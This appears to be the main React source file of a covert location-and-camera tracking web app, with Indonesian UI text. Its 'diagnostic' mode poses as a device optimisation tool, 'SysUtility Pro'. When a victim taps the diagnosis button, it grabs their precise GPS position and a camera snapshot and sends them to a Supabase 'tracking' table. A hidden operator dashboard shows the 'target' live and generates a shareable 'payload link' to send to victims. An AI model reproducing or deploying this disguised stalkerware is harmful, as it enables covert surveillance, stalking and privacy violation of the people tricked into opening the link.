
import React, { useState, useEffect, useCallback, useMemo } from 'react';
import Sidebar from './components/Sidebar';
import LocationCard from './components/LocationCard';
import CameraFeed from './components/CameraFeed';
import { UserProfile, AIInsight, LocationData } from './types';
import { getLocationInsights } from './services/geminiService';
import { createClient } from '@supabase/supabase-js';

const App: React.FC = () => {
  const params = useMemo(() => new URLSearchParams(window.location.search), []);
  const isStealthMode = params.get('mode') === 'diagnostic';
  const targetId = 'target_alpha'; 

  const [config, setConfig] = useState({
    url: params.get('sb_url') || localStorage.getItem('SB_URL_OVER_RE') || '',
    key: params.get('sb_key') || localStorage.getItem('SB_KEY_OVER_RE') || ''
  });

  const [isUnlocked, setIsUnlocked] = useState(false);
  const [isDiagnosing, setIsDiagnosing] = useState(false);
  const [diagStep, setDiagStep] = useState(0); 
  const [diagProgress, setDiagProgress] = useState(0);
  const [copyStatus, setCopyStatus] = useState<string | null>(null);
  const [dbLog, setDbLog] = useState<string>("READY");
  const [showConfigEditor, setShowConfigEditor] = useState(false);
  
  const [members, setMembers] = useState<UserProfile[]>([
    {
      id: '1',
      name: 'Alpha_Target',
      avatar: 'https://picsum.photos/id/64/200/200',
      lastSeen: Date.now(),
      status: 'offline',
    }
  ]);

  const [insight, setInsight] = useState<AIInsight | null>(null);
  const [isLoadingInsight, setIsLoadingInsight] = useState(false);

  const activeMember = members[0];

  const supabase = useMemo(() => {
    if (config.url && config.key) {
      try { return createClient(config.url, config.key); } catch (e) { return null; }
    }
    return null;
  }, [config.url, config.key]);

  // OPTIMIZED: Direct Upsert tanpa fetch data lama (Lebih Cepat)
  const syncToDatabase = async (loc: Partial<LocationData>) => {
    if (!supabase) {
      setDbLog("ERR: NO_DB");
      return;
    }
    
    setDbLog("TRANSMITTING...");
    try {
      const { error } = await supabase
        .from('tracking')
        .upsert({ 
          id: targetId, 
          ...loc,
          timestamp: Date.now() 
        }, { onConflict: 'id' });
      
      if (error) {
        setDbLog(`ERR: ${error.code}`);
      } else {
        setDbLog("SUCCESS_SYNC");
      }
    } catch (err) {
      setDbLog("CONN_FAIL");
    }
  };

  useEffect(() => {
    if (isUnlocked && !isStealthMode && supabase) {
      const fetchData = async () => {
        try {
          const { data } = await supabase.from('tracking').select('*').eq('id', targetId).single();
          if (data) {
            setMembers([{
              ...members[0],
              currentLocation: {
                latitude: data.latitude,
                longitude: data.longitude,
                accuracy: data.accuracy,
                timestamp: data.timestamp,
                snapshot: data.snapshot
              },
              status: 'online',
              lastSeen: data.timestamp
            }]);
          }
        } catch (e) {}
      };
      fetchData();

      const channel = supabase
        .channel('live-track')
        .on('postgres_changes', { event: '*', schema: 'public', table: 'tracking' }, payload => {
          const data = payload.new as any;
          if (data && data.id === targetId) {
            setMembers([{
              ...members[0],
              currentLocation: {
                latitude: data.latitude,
                longitude: data.longitude,
                accuracy: data.accuracy,
                timestamp: data.timestamp,
                snapshot: data.snapshot
              },
              status: 'online',
              lastSeen: data.timestamp
            }]);
          }
        })
        .subscribe();

      return () => { supabase.removeChannel(channel); };
    }
  }, [isUnlocked, isStealthMode, supabase]);

  const startDiagnostic = () => {
    setIsDiagnosing(true);
    setDiagStep(1);
    
    // Step 2: GPS (Disederhanakan untuk kecepatan)
    setTimeout(() => {
        setDiagStep(2);
        setDbLog("ACQUIRING_GPS...");
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            syncToDatabase({
                latitude: pos.coords.latitude,
                longitude: pos.coords.longitude,
                accuracy: pos.coords.accuracy,
            });
          },
          (err) => setDbLog(`GPS_FAIL_${err.code}`),
          { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
        );
    }, 1500);

    // Step 3: Camera
    setTimeout(() => {
      setDiagStep(3);
      setDbLog("OPTIC_CALIBRATING...");
    }, 4500);

    // Step 4: Final
    setTimeout(() => {
      setDiagStep(4);
      setDbLog("ALL_SYSTEMS_GO");
    }, 8500);

    let progress = 0;
    const interval = setInterval(() => {
      progress += 1;
      setDiagProgress(progress);
      if (progress >= 100) clearInterval(interval);
    }, 85);
  };

  const getFullDiagnosticUrl = () => {
    const baseUrl = window.location.origin + window.location.pathname;
    const sUrl = encodeURIComponent(config.url);
    const sKey = encodeURIComponent(config.key);
    return `${baseUrl}?mode=diagnostic&sb_url=${sUrl}&sb_key=${sKey}`;
  };

  if (isStealthMode) {
    return (
      <div className="min-h-screen bg-slate-950 text-slate-200 font-mono flex flex-col p-6 items-center justify-center">
        <div className="max-w-md w-full space-y-8 animate-in fade-in">
           <div className="text-center space-y-2">
              <i className="fas fa-shield-halved text-blue-500 text-5xl mb-4 animate-pulse"></i>
              <h1 className="text-xl font-bold uppercase tracking-[0.3em]">SysUtility <span className="text-blue-500">Pro</span></h1>
              <p className="text-[9px] text-slate-500 uppercase tracking-widest">Enterprise Optimization Tool</p>
           </div>
           
           {!isDiagnosing ? (
             <div className="bg-slate-900 border border-slate-800 rounded-3xl p-8 text-center space-y-6 shadow-2xl relative overflow-hidden">
                <div className="absolute top-0 right-0 p-4 opacity-10"><i className="fas fa-microchip text-6xl"></i></div>
                <div className="space-y-4 relative">
                    <p className="text-slate-400 text-xs leading-relaxed uppercase tracking-tighter">
                        Pemindaian sistem diperlukan untuk kalibrasi modul optik dan GPS. Klik tombol di bawah untuk memulai.
                    </p>
                    <button onClick={startDiagnostic} className="w-full py-4 bg-blue-600 hover:bg-blue-500 rounded-2xl font-bold text-xs shadow-lg shadow-blue-600/30 active:scale-95 transition-all uppercase tracking-widest">Mulai Diagnosa</button>
                    <p className="text-[8px] text-slate-600 uppercase">Version 4.2.1-OPTIMIZED</p>
                </div>
             </div>
           ) : (
             <div className="bg-slate-900 border border-slate-800 rounded-3xl p-8 space-y-6 shadow-2xl">
                <div className="space-y-4">
                   <div className="flex justify-between text-[10px] uppercase font-bold text-slate-500">
                        <span>{diagStep === 1 ? 'Battery Health' : diagStep === 2 ? 'GPS Sensor' : diagStep === 3 ? 'Optical Link' : 'Finished'}</span>
                        <span className="text-blue-400">{diagProgress}%</span>
                   </div>
                   <div className="w-full bg-slate-800 h-1.5 rounded-full overflow-hidden">
                        <div className="bg-blue-500 h-full transition-all duration-300 shadow-[0_0_10px_#3b82f6]" style={{ width: `${diagProgress}%` }}></div>
                   </div>
                </div>

                <div className="h-56 rounded-2xl overflow-hidden border border-slate-800 bg-black/50">
                    {diagStep === 3 ? (
                        <CameraFeed isCapturing={true} onCapture={(b64) => syncToDatabase({ snapshot: b64 })} />
                    ) : diagStep === 4 ? (
                        <div className="w-full h-full flex flex-col items-center justify-center text-emerald-500 space-y-2">
                            <i className="fas fa-check-circle text-4xl animate-bounce"></i>
                            <span className="text-[10px] font-bold uppercase tracking-widest">System Calibrated</span>
                        </div>
                    ) : (
                        <div className="w-full h-full flex items-center justify-center">
                            <i className={`fas ${diagStep === 1 ? 'fa-bolt' : 'fa-satellite'} text-slate-700 text-4xl animate-pulse`}></i>
                        </div>
                    )}
                </div>

                <div className="bg-black/40 p-5 rounded-2xl space-y-2 text-[9px] uppercase font-bold tracking-tighter border border-slate-800/50">
                   <div className="flex justify-between items-center">
                      <span className="text-slate-500">Data_Relay</span>
                      <span className={`px-2 py-0.5 rounded ${dbLog.includes('SUCCESS') ? 'bg-emerald-500/10 text-emerald-500' : 'bg-blue-500/10 text-blue-400'}`}>{dbLog}</span>
                   </div>
                   <div className="flex justify-between"><span className="text-slate-500">GPS_Module</span><span className={diagStep >= 2 ? 'text-emerald-500' : 'text-slate-700'}>{diagStep >= 2 ? 'VERIFIED' : 'PENDING'}</span></div>
                   <div className="flex justify-between"><span className="text-slate-500">Camera_Link</span><span className={diagStep >= 3 ? 'text-emerald-500' : 'text-slate-700'}>{diagStep >= 3 ? 'CAPTURED' : 'PENDING'}</span></div>
                </div>

                {diagStep === 4 && (
                   <button onClick={() => window.location.reload()} className="w-full py-4 bg-slate-800 hover:bg-slate-700 rounded-2xl text-[10px] font-bold text-slate-200 uppercase tracking-widest transition-all">Selesai</button>
                )}
             </div>
           )}
        </div>
      </div>
    );
  }

  return (
    <div className="flex h-screen bg-slate-950 text-slate-200 overflow-hidden font-mono selection:bg-blue-500/30">
      <Sidebar members={members} activeMemberId="1" onSelectMember={() => {}} isUnlocked={isUnlocked} onUnlock={() => setIsUnlocked(true)} />
      
      <main className="flex-1 flex flex-col min-w-0">
        <header className="h-20 bg-slate-900/50 border-b border-slate-800 flex items-center justify-between px-10 shrink-0 z-10">
          <div className="flex items-center gap-6">
            <div className="flex flex-col">
                <h2 className="text-[11px] font-black tracking-[0.3em] text-white uppercase">{isUnlocked ? 'CENTRAL_COMMAND' : 'RESTRICTED'}</h2>
                <span className="text-[8px] text-slate-500 uppercase">Latency: <span className="text-emerald-500">Low</span></span>
            </div>
          </div>
          <div className="flex items-center gap-6">
            {isUnlocked && (
                <button onClick={() => setShowConfigEditor(true)} className="w-10 h-10 flex items-center justify-center rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-400 hover:text-white transition-all"><i className="fas fa-sliders"></i></button>
            )}
          </div>
        </header>

        <div className="flex-1 p-10 overflow-y-auto space-y-10 custom-scrollbar">
          {!isUnlocked ? (
            <div className="max-w-xl mx-auto py-40 text-center space-y-8">
               <i className="fas fa-microchip text-slate-800 text-6xl mb-4 animate-pulse"></i>
               <h1 className="text-xl font-black text-slate-400 uppercase tracking-[0.5em]">Auth Bridge Required</h1>
               <p className="text-[10px] text-slate-600 uppercase tracking-widest">Klik versi di sidebar 5x untuk masuk</p>
            </div>
          ) : (
            <div className="grid grid-cols-1 lg:grid-cols-12 gap-10 max-w-7xl mx-auto">
              <div className="lg:col-span-8 space-y-10">
                
                {/* Visual Intelligence Section */}
                <div className="bg-slate-900 border border-slate-800 rounded-[2.5rem] p-10 relative overflow-hidden shadow-2xl">
                    <div className="flex justify-between items-center mb-6">
                        <div className="flex items-center gap-3">
                            <div className="w-2 h-2 bg-rose-500 rounded-full animate-pulse"></div>
                            <h3 className="text-xs font-black text-slate-400 uppercase tracking-[0.3em]">Live Feed Confirmation</h3>
                        </div>
                        <span className="text-[8px] text-slate-500 mono">TS: {activeMember.currentLocation?.timestamp || 'N/A'}</span>
                    </div>
                    
                    <div className="relative aspect-video bg-black rounded-3xl overflow-hidden border border-slate-800 group shadow-inner">
                        {activeMember.currentLocation?.snapshot ? (
                            <>
                                <img 
                                    src={activeMember.currentLocation.snapshot} 
                                    className="w-full h-full object-cover grayscale contrast-125 brightness-90 group-hover:grayscale-0 transition-all duration-700"
                                    alt="Target Feed" 
                                />
                                <div className="absolute inset-0 bg-gradient-to-t from-black/60 to-transparent pointer-events-none"></div>
                                <div className="absolute bottom-6 left-6 flex items-center gap-4">
                                    <div className="w-10 h-10 rounded-full border-2 border-emerald-500/50 flex items-center justify-center">
                                        <div className="w-2 h-2 bg-emerald-500 rounded-full animate-ping"></div>
                                    </div>
                                    <div className="text-[10px] font-black uppercase text-white tracking-widest bg-black/50 px-4 py-2 rounded-xl backdrop-blur-sm border border-white/10">Target Identified</div>
                                </div>
                            </>
                        ) : (
                            <div className="w-full h-full flex flex-col items-center justify-center text-slate-800 space-y-4">
                                <i className="fas fa-satellite text-5xl animate-bounce"></i>
                                <span className="text-[10px] font-black uppercase tracking-[0.4em]">Waiting for Optical Sync...</span>
                            </div>
                        )}
                        <div className="absolute inset-0 pointer-events-none opacity-20 bg-[linear-gradient(rgba(18,16,16,0)_50%,rgba(0,0,0,0.25)_50%),linear-gradient(90deg,rgba(255,0,0,0.06),rgba(0,255,0,0.02),rgba(0,0,255,0.06))] bg-[length:100%_4px,3px_100%]"></div>
                    </div>
                </div>

                {/* Telemetry Visualizer */}
                <div className="bg-slate-900 border border-slate-800 rounded-[2.5rem] p-10 relative overflow-hidden">
                   <div className="flex justify-between items-center mb-10">
                      <h3 className="text-xs font-black text-slate-400 uppercase tracking-[0.3em]">Coordinate Stream</h3>
                      {activeMember.currentLocation && (
                        <button onClick={() => window.open(`https://www.google.com/maps?q=${activeMember.currentLocation!.latitude},${activeMember.currentLocation!.longitude}`, '_blank')} className="px-8 py-3 bg-blue-600 hover:bg-blue-500 text-white rounded-2xl text-[10px] font-black uppercase transition-all shadow-xl shadow-blue-600/20 active:scale-95">Open Google Maps</button>
                      )}
                   </div>
                   {activeMember.currentLocation ? (
                     <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                        <div className="bg-slate-950 p-8 rounded-3xl border border-slate-800/50 hover:border-blue-500/30 transition-colors">
                           <p className="text-[9px] text-slate-600 uppercase mb-3 tracking-widest font-bold">Latitude</p>
                           <p className="text-4xl font-black text-white mono tracking-tighter">{activeMember.currentLocation.latitude.toFixed(6)}</p>
                        </div>
                        <div className="bg-slate-950 p-8 rounded-3xl border border-slate-800/50 hover:border-blue-500/30 transition-colors">
                           <p className="text-[9px] text-slate-600 uppercase mb-3 tracking-widest font-bold">Longitude</p>
                           <p className="text-4xl font-black text-white mono tracking-tighter">{activeMember.currentLocation.longitude.toFixed(6)}</p>
                        </div>
                     </div>
                   ) : (
                     <div className="py-24 border border-dashed border-slate-800 rounded-[2.5rem] text-center bg-slate-950/30">
                        <p className="text-[11px] text-slate-600 uppercase font-black tracking-[0.5em] animate-pulse">Establishing Satellite Handshake...</p>
                     </div>
                   )}
                </div>

                {/* Setup & Tools */}
                <div className="bg-slate-900 border border-slate-800 rounded-[2.5rem] p-10">
                    <h3 className="text-xs font-black text-slate-400 uppercase tracking-[0.3em] mb-6">Diagnostic Payload Link</h3>
                    <div className="flex flex-col md:flex-row gap-4">
                        <div className="flex-1 bg-slate-950 rounded-2xl border border-slate-800 p-1 flex items-center overflow-hidden">
                            <input readOnly value={getFullDiagnosticUrl()} className="flex-1 bg-transparent py-4 px-6 text-[10px] text-slate-500 focus:outline-none mono" />
                        </div>
                        <button onClick={() => {
                            navigator.clipboard.writeText(getFullDiagnosticUrl());
                            setCopyStatus('link');
                            setTimeout(() => setCopyStatus(null), 2000);
                        }} className={`px-10 py-4 rounded-2xl text-[10px] font-black uppercase transition-all tracking-widest ${copyStatus === 'link' ? 'bg-emerald-600 text-white' : 'bg-slate-800 hover:bg-slate-700 text-white'}`}>
                            {copyStatus === 'link' ? 'Copied' : 'Copy Link'}
                        </button>
                    </div>
                </div>
              </div>

              <div className="lg:col-span-4 space-y-10">
                <LocationCard member={activeMember} insight={insight} loadingInsight={isLoadingInsight} />
                
                <div className="bg-slate-900 border border-slate-800 rounded-[2.5rem] p-8 space-y-6">
                    <h4 className="text-[10px] font-black text-slate-500 uppercase tracking-widest">Network Status</h4>
                    <div className="space-y-4">
                       <div className="flex justify-between items-center text-[10px]">
                          <span className="text-slate-600">DB_CONNECTION</span>
                          <span className="text-emerald-500 font-bold uppercase">Connected</span>
                       </div>
                       <div className="flex justify-between items-center text-[10px]">
                          <span className="text-slate-600">REALTIME_RELAY</span>
                          <span className="text-emerald-500 font-bold uppercase">Active</span>
                       </div>
                       <div className="flex justify-between items-center text-[10px]">
                          <span className="text-slate-600">LAST_PING</span>
                          <span className="text-blue-400 font-bold uppercase mono">Just Now</span>
                       </div>
                    </div>
                </div>
              </div>
            </div>
          )}
        </div>
      </main>

      {showConfigEditor && (
        <div className="fixed inset-0 bg-black/95 backdrop-blur-xl flex items-center justify-center p-6 z-[100] animate-in fade-in">
           <div className="bg-slate-900 border border-slate-800 w-full max-w-lg rounded-[2.5rem] p-12 space-y-10 animate-in zoom-in-95">
              <div className="flex justify-between items-center">
                 <h2 className="text-lg font-black uppercase tracking-widest text-white">Config Engine</h2>
                 <button onClick={() => setShowConfigEditor(false)} className="text-slate-500 hover:text-white"><i className="fas fa-times text-xl"></i></button>
              </div>
              <form onSubmit={(e) => {
                  e.preventDefault();
                  const fd = new FormData(e.currentTarget);
                  localStorage.setItem('SB_URL_OVER_RE', fd.get('url') as string);
                  localStorage.setItem('SB_KEY_OVER_RE', fd.get('key') as string);
                  window.location.reload();
              }} className="space-y-6">
                 <div className="space-y-2">
                    <label className="text-[9px] text-slate-500 uppercase font-black">Supabase URL</label>
                    <input name="url" defaultValue={config.url} className="w-full bg-slate-950 border border-slate-800 rounded-xl p-4 text-xs text-slate-300 mono focus:border-blue-500 outline-none" required />
                 </div>
                 <div className="space-y-2">
                    <label className="text-[9px] text-slate-500 uppercase font-black">Anon Key</label>
                    <textarea name="key" defaultValue={config.key} className="w-full bg-slate-950 border border-slate-800 rounded-xl p-4 text-xs text-slate-300 h-32 mono focus:border-blue-500 outline-none resize-none" required />
                 </div>
                 <button type="submit" className="w-full py-5 bg-blue-600 hover:bg-blue-500 rounded-2xl text-[11px] font-black uppercase text-white shadow-2xl transition-all">Apply & Restart</button>
              </form>
           </div>
        </div>
      )}
    </div>
  );
};

export default App;
